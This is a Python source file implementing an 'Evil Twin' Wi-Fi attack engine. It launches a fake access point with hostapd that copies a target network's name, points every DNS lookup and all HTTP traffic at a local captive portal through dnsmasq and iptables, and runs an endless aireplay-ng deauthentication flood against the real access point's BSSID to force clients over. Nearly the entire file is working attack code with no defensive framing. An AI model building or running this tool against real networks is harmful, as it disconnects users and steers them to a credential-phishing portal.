import subprocess
import threading
import time
import os

class EvilTwinEngine:
    def __init__(self, interface, bssid, essid, channel, on_log, on_success):
        self.interface = interface
        self.bssid = bssid
        self.essid = essid
        self.channel = str(channel)
        self.on_log = on_log
        self.on_success = on_success
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.running = False
        self.mon_interface = "mon0"
        
        self.hostapd_conf = "/tmp/vekt_hostapd.conf"
        self.dnsmasq_conf = "/tmp/vekt_dnsmasq.conf"

    def start(self):
        self.running = True
        self.on_log(f"[*] Starting Evil Twin for {self.essid} on Ch {self.channel}...")
        
        self.thread = threading.Thread(target=self._setup_and_run, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.hostapd_proc:
            self.hostapd_proc.terminate()
            self.hostapd_proc.wait()
        if self.dnsmasq_proc:
            self.dnsmasq_proc.terminate()
            self.dnsmasq_proc.wait()
        
        self.on_log("[!] Evil Twin stopped. Restoring interface...")
        # Cleanup iptables
        subprocess.run(["iptables", "-t", "nat", "-F", "PREROUTING"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Remove virtual interface
        subprocess.run(["iw", "dev", self.mon_interface, "del"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Restore DHCP
        subprocess.run(["ip", "addr", "flush", "dev", self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", self.interface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", self.interface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _setup_and_run(self):
        try:
            # 1. Set interface to managed mode for hostapd
            subprocess.run(["ip", "link", "set", self.interface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iw", "dev", self.interface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "set", self.interface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 2. Assign static IP
            subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.on_log(f"[+] Interface {self.interface} set to 10.0.0.1")

            # 3. Setup iptables to redirect HTTP (Port 80) to our FastAPI portal
            subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.interface, "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:8000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.on_log("[+] IPTABLES rules applied for Captive Portal")

            # 4. Create hostapd config
            with open(self.hostapd_conf, "w") as f:
                f.write(f"interface={self.interface}\n")
                f.write(f"ssid={self.essid}\n")
                f.write(f"channel={self.channel}\n")
                f.write("driver=nl80211\n")
                f.write("hw_mode=g\n")
            
            # 5. Create dnsmasq config
            with open(self.dnsmasq_conf, "w") as f:
                f.write(f"interface={self.interface}\n")
                f.write("dhcp-range=10.0.0.10,10.0.0.100,8h\n")
                f.write("address=/#/10.0.0.1\n")
            
            # 6. Start dnsmasq
            self.on_log("[*] Starting DHCP & DNS server (dnsmasq)...")
            self.dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", self.dnsmasq_conf, "-d"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            # 7. Start hostapd
            self.on_log("[*] Spawning Fake Access Point (hostapd)...")
            self.hostapd_proc = subprocess.Popen(["hostapd", self.hostapd_conf], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            # 8. Create virtual monitor interface for Deauth
            subprocess.run(["iw", "dev", self.interface, "interface", "add", self.mon_interface, "type", "monitor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "set", self.mon_interface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.on_log(f"[+] Virtual interface {self.mon_interface} created for Deauth")
            
            # Start Deauth Loop
            self.deauth_thread = threading.Thread(target=self._deauth_loop, daemon=True)
            self.deauth_thread.start()

            # Monitor hostapd output
            for line in self.hostapd_proc.stdout:
                if not self.running: break
                if line.strip():
                    self.on_log(f"[hostapd] {line.strip()}")
                    
        except Exception as e:
            self.on_log(f"[-] Evil Twin error: {e}")
            self.stop()

    def _deauth_loop(self):
        self.on_log("[*] Starting Deauth loop on original AP...")
        cmd = ["aireplay-ng", "--deauth", "0", "-a", self.bssid, self.mon_interface]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            while self.running:
                time.sleep(1)
            proc.terminate()
            proc.wait()
        except Exception as e:
            self.on_log(f"[-] Deauth error: {e}")
